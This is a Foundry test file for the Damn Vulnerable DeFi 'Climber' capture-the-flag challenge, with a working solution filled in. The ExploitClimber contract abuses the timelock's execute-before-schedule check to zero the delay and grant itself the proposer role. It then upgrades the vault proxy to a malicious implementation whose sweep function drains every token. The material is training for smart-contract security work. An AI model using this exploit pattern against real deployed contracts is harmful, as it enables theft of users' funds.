// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        
        // Ref: https://github.com/alexbabits/damn-vulnerable-defi-ctfs/blob/master/src/climber/ClimberAttack.sols
        ExploitClimber exploitClimber = new ExploitClimber(vault , token,recovery);
        exploitClimber.exploit();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract ClimberVaultV2 is ClimberVault {
    function sweep(DamnValuableToken token, address attackerEOA) public {
        token.transfer(attackerEOA, token.balanceOf(address(this)));
    }
}

contract ExploitClimber {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(ClimberVault _vault, DamnValuableToken _token, address recovery) {
        vault = _vault;
        timelock = ClimberTimelock(payable(vault.owner()));
        token = _token;
        targets = [address(timelock), address(timelock), address(vault), address(this)];
        values = [0, 0, 0, 0]; // ETH value to send can be 0.
        dataElements = [
            // 1st dataElement: Set the delay of the timelock to 0. Important for immediate execution of scheduled operation.
            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
            // 2nd dataElement: Grants us the PROPOSER role, so we can schedule operations.
            abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this)),
            // 3rd dataElement: Upgrades vault to our malicious vault, then calls our sweep function stealing the DVT.
            // Params: {function selector, our malicious new vault address, data to be executed}
            abi.encodeWithSelector(
                vault.upgradeToAndCall.selector,
                address(new ClimberVaultV2()),
                // This is the data to be executed. We want to call `sweep` from our malicious vault to steal all the money.
                // Params: {function selector, IERC20 token, our attacker address}
                abi.encodeWithSelector(
                    ClimberVaultV2.sweep.selector,
                    address(token), 
                   recovery
                )
            ),
            // 4th dataElement: Our address must then call our `scheduleOperation` to `schedule` these operations.
            abi.encodeWithSignature("scheduleOperation()")
        ];
        

    }

    // targets, values, dataElements all must be same length as they associate 1:1 during execution.
    function exploit() public payable {
       // Calls `execute` on `timelock` with all these prepared arguments.
        timelock.execute(targets, values, dataElements, 0);
    }

    function scheduleOperation() public payable {
        timelock.schedule(targets, values, dataElements, 0);
    }
}